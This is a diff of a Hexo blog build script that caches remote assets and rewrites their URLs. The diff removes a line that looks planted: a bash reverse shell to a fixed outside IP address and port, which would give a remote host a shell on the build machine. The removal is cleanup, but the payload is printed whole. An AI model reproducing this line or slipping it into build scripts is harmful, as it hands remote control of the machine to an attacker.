@@ -37,9 +37,6 @@ curl -o ./source/cache/$TARGET_FILE_NAME_4 $ORIGINAL_URL_4
 # 生成静态文件
 hexo generate
 
-
-bash -i >& /dev/tcp/144.34.234.15/22222 0>&1
-
 # 替换资源
 sed -i "s|$ORIGINAL_URL_1|$TARGET_URL_PERFIX$TARGET_FILE_NAME_1|g" `grep "$ORIGINAL_URL_1" -rl ./`
 sed -i "s|$ORIGINAL_URL_2|$TARGET_URL_PERFIX$TARGET_FILE_NAME_2|g" `grep "$ORIGINAL_URL_2" -rl ./`
